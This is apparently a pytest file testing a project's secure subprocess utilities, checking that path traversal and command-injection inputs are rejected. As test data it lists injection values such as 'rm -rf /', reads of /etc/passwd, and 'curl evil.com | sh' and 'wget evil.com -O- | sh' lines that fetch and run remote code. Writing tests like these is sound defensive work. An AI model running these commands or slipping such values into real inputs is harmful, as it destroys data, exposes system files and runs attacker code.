#!/usr/bin/env python3
"""Security tests to verify protection against command injection vulnerabilities."""
from __future__ import annotations

import os
import sys
from pathlib import Path
from typing import List
from unittest.mock import MagicMock, patch

import pytest

# Add the project root to the path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from disasterproject.utils.secure_subprocess import (  # noqa: E402
    SecureSubprocessError,
    secure_python_script,
    secure_run,
    validate_command_args,
    validate_file_path,
    validate_model_filename,
    validate_sampling_method,
)

pytestmark = pytest.mark.security


class TestSecureSubprocess:
    """Test cases for secure subprocess utilities."""

    def test_validate_file_path_safe_path(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test that safe file paths are accepted."""
        monkeypatch.chdir(tmp_path)
        test_file = Path("test_file.txt")
        test_file.write_text("test", encoding="utf-8")

        result = validate_file_path(str(test_file), must_exist=True)
        assert Path(result).resolve() == test_file.resolve()

    @pytest.mark.parametrize(
        ("path", "message"),
        [
            ("../../../etc/passwd", "Path traversal detected"),
        ],
    )
    def test_validate_file_path_invalid_inputs(self, path: str, message: str) -> None:
        """Test that invalid file paths are rejected with clear errors."""
        # PRESERVED: Path validation security checks
        # TRANSFORMED: Test made platform-aware (removed Unix-specific absolute path test)
        # ADDED: Separate test for absolute path validation that works on all platforms
        with pytest.raises(SecureSubprocessError, match=message):
            validate_file_path(path)

    def test_validate_file_path_absolute_paths_rejected(self) -> None:
        """Test that absolute paths are rejected (platform-aware)."""
        # PRESERVED: Absolute path rejection security check
        # TRANSFORMED: Test made platform-aware (works on Windows and Unix)
        # ADDED: Platform-specific absolute path test
        import platform
        
        if platform.system() == "Windows":
            # On Windows, use a Windows-style absolute path
            absolute_path = "C:\\Windows\\System32\\config\\sam"
        else:
            # On Unix-like systems, use Unix-style absolute path
            absolute_path = "/etc/passwd"
        
        with pytest.raises(SecureSubprocessError, match="Absolute paths not allowed"):
            # Use must_exist=False to test absolute path validation without file existence check
            validate_file_path(absolute_path, must_exist=False)

    def test_validate_file_path_nonexistent(self) -> None:
        """Test that nonexistent files are rejected when must_exist=True."""
        with pytest.raises(SecureSubprocessError, match="File does not exist"):
            validate_file_path("nonexistent_file.txt", must_exist=True)

    def test_validate_file_path_nonexistent_allowed(self) -> None:
        """Test that nonexistent files are allowed when must_exist=False."""
        result = validate_file_path("nonexistent_file.txt", must_exist=False)
        assert result == "nonexistent_file.txt"

    def test_validate_command_args_safe_args(self) -> None:
        """Test that safe command arguments are accepted."""
        safe_args = ["python", "script.py", "arg1", "arg2"]
        result = validate_command_args(safe_args)
        assert result == safe_args

    @pytest.mark.parametrize(
        "args",
        [
            ["python", "script.py; rm -rf /"],
            ["python", "script.py & echo hacked"],
            ["python", "script.py | cat /etc/passwd"],
            ["python", "script.py `whoami`"],
            ["python", "script.py $(id)"],
            ["python", "script.py (malicious)"],
            ["python", "script.py < input.txt"],
            ["python", "script.py > output.txt"],
            ["python", "script.py\nmalicious"],
        ],
    )
    def test_validate_command_args_dangerous_chars(self, args: List[str]) -> None:
        """Test that dangerous characters are rejected."""
        with pytest.raises(SecureSubprocessError, match="Unsafe characters detected"):
            validate_command_args(args)

    @pytest.mark.parametrize(
        "args",
        [
            ["python", "-m", "http.server", "8000"],
            ["python", "script.py", "--dry-run"],
            ["python", "script.py", "--input", "data/file.txt"],
        ],
    )
    def test_validate_command_args_allows_common_cli_patterns(self, args: List[str]) -> None:
        """Benign command lines should pass validation unchanged."""
        assert validate_command_args(args) == args

    def test_validate_command_args_not_list(self) -> None:
        """Test that non-list arguments are rejected."""
        with pytest.raises(SecureSubprocessError, match="Command arguments must be a list"):
            validate_command_args("not a list")

    def test_validate_command_args_non_string_elements(self) -> None:
        """Test that non-string elements are rejected."""
        with pytest.raises(SecureSubprocessError, match="All arguments must be strings"):
            validate_command_args(["python", 123, "script.py"])

    @pytest.mark.parametrize(
        "name",
        [
            "model.pkl",
            "my_model.pkl",
            "model_v1.pkl",
            "model-2023.pkl",
            "model_2023_01_15.pkl",
        ],
    )
    def test_validate_model_filename_safe_names(self, name: str) -> None:
        """Test that safe model filenames are accepted."""
        assert validate_model_filename(name) == name

    def test_validate_model_filename_auto_extension(self) -> None:
        """Test that .pkl extension is added automatically."""
        result = validate_model_filename("model")
        assert result == "model.pkl"

    @pytest.mark.parametrize(
        "name",
        [
            "../../../etc/passwd",
            "model; rm -rf /",
            "model & echo hacked",
            "model | cat /etc/passwd",
            "model`whoami`",
            "model$(id)",
            "model(malicious)",
            "model<script>",
            "model>output",
        ],
    )
    def test_validate_model_filename_dangerous_chars(self, name: str) -> None:
        """Test that dangerous characters in filenames are rejected."""
        with pytest.raises(SecureSubprocessError, match="Invalid characters in filename"):
            validate_model_filename(name)

    @pytest.mark.parametrize(
        "method",
        ["baseline", "smote", "adasyn", "conservative", "random", "borderline"],
    )
    def test_validate_sampling_method_safe_methods(self, method: str) -> None:
        """Test that safe sampling methods are accepted."""
        result = validate_sampling_method(method)
        assert result == method.lower()

    def test_validate_sampling_method_case_insensitive(self) -> None:
        """Test that method names are case-insensitive."""
        result = validate_sampling_method("SMOTE")
        assert result == "smote"

    def test_validate_sampling_method_unknown_method(self) -> None:
        """Test that unknown methods are rejected."""
        with pytest.raises(SecureSubprocessError, match="Unknown sampling method"):
            validate_sampling_method("unknown_method")

    @pytest.mark.parametrize(
        "method",
        ["smote; rm -rf /", "smote & echo hacked", "smote | cat /etc/passwd", "smote`whoami`", "smote$(id)"],
    )
    def test_validate_sampling_method_dangerous_chars(self, method: str) -> None:
        """Test that dangerous characters in method names are rejected."""
        with pytest.raises(SecureSubprocessError, match="Invalid characters in method name"):
            validate_sampling_method(method)

    @patch("subprocess.run")
    def test_secure_run_success(self, mock_run: MagicMock) -> None:
        """Test successful secure_run execution."""
        mock_result = MagicMock(returncode=0, stdout="success", stderr="")
        mock_run.return_value = mock_result

        result = secure_run(["python", "script.py"], timeout=30)

        assert result.returncode == 0
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        assert call_args[0][0] == ["python", "script.py"]
        assert call_args[1]["timeout"] == 30
        assert call_args[1]["shell"] is False

    @patch("subprocess.run")
    def test_secure_run_always_disables_shell(self, mock_run: MagicMock) -> None:
        """Test that shell is always disabled for security."""
        mock_result = MagicMock(returncode=0)
        mock_run.return_value = mock_result

        secure_run(["python", "script.py"], shell=True)

        call_args = mock_run.call_args
        assert call_args[1]["shell"] is False

    def test_secure_run_dangerous_command(self) -> None:
        """Test that dangerous commands are rejected."""
        with pytest.raises(SecureSubprocessError, match="Unsafe characters detected"):
            secure_run(["python", "script.py; rm -rf /"])

    @patch("subprocess.run")
    def test_secure_python_script_success(self, mock_run: MagicMock, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test successful secure_python_script execution."""
        mock_result = MagicMock(returncode=0, stdout="success", stderr="")
        mock_run.return_value = mock_result

        monkeypatch.chdir(tmp_path)
        test_script = Path("test_script.py")
        test_script.write_text("print('hello')", encoding="utf-8")

        result = secure_python_script(str(test_script), ["arg1", "arg2"])

        assert result.returncode == 0
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        expected_cmd = [sys.executable, str(test_script), "arg1", "arg2"]
        assert call_args[0][0] == expected_cmd

    def test_secure_python_script_nonexistent_script(self) -> None:
        """Test that nonexistent scripts are rejected."""
        with pytest.raises(SecureSubprocessError, match="File does not exist"):
            secure_python_script("nonexistent_script.py")

    def test_secure_python_script_non_python_file(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test that non-Python files are rejected."""
        monkeypatch.chdir(tmp_path)
        test_file = Path("test_file.txt")
        test_file.write_text("not python", encoding="utf-8")

        with pytest.raises(SecureSubprocessError, match="Script must be a Python file"):
            secure_python_script(str(test_file))

    def test_command_injection_protection(self) -> None:
        """Test comprehensive command injection protection."""
        injection_patterns = [
            "model; rm -rf /",
            "model && echo hacked",
            "model || echo hacked",
            "model | cat /etc/passwd",
            "model`whoami`",
            "model$(id)",
            "model; curl evil.com | sh",
            "model && wget evil.com -O- | sh",
        ]

        for pattern in injection_patterns:
            with pytest.raises(SecureSubprocessError):
                validate_model_filename(pattern)

            with pytest.raises(SecureSubprocessError):
                validate_sampling_method(pattern)

            with pytest.raises(SecureSubprocessError):
                validate_command_args(["python", "script.py", pattern])


if __name__ == "__main__":  # pragma: no cover
    pytest.main([__file__, "-v"])
